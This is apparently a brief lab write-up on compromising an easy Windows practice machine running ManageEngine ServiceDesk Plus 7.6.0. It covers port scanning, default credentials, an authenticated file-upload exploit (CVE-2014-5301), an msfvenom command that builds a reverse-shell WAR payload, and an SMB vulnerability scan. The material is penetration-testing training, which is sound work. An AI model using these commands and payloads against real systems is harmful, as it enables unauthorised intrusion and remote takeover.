machine info: This is a 10 point Windows machine. Offensive Difficulty is Easy, same as Community Rated Difficulty.

## Information Gathering

First of all, I use masscan scanning the open ports.

```
masscan -p1-65535,U:53,69,161 $target_ip --rate=5000 -e tun0 -oG masscan-$target_ip
```

The output file shows me some ports, I use nmap for further infomation.

```
port_str=`cat masscan-$target_ip | grep "/open/tcp/" |cut -f 4 -d ":" |cut -f 2 -d " " |cut -f 1 -d "/" | tr '\n' ',' |sed 's/.$//'`;nmap -A -p$port_str $target_ip -oN nmap-$target_ip
```

## Initial Access

Web Service is ManageEngine ServiceDesk Plus, and the version is 7.6.0.

Searching in google for default credentials.

Fortunately, this credential can be used in this machine.

Using searchsploit to get if there any exploits can execute. As the result, there is a File Upload module in metasploit. `ManageEngine (Multiple Products) - (Authenticated) Arbitrary File Upload (Metasploit)                                                                                                                     | java/remote/35845.rb`

Usually, the metasploit scripts carry the CVE number, so does it.

After google, a python script in [github]([exploits/CVE-2014-5301.py at master Â· PeterSufliarsky/exploits (github.com)](https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py)). I'm trying not to use metasploit in this machine, but I can't find a perfect war shell not using msf. 

Now, I have to use msf:

```
msfvenom -p java/shell_reverse_tcp LHOST=ip LPORT=port -f war > shell.war
```

Easily using the python script reverse shell finally.

The user we login is `nt authority\system`,just cat the flag.
that's all: )

## Other Path

Scanning the smb vulnerable in nmap. Why to do that? You can see the version of Windows if pretty old, it might be a smb vulns!

```
nmap --script smb-vuln*.nse -p 139,445 $target_ip -Pn -oN smb-vuln-scan

```

There is a result.

After google it, exploitdb shows me it is a RCE vuln. It is hard to write the payload by self, so still using msf.

same as before.
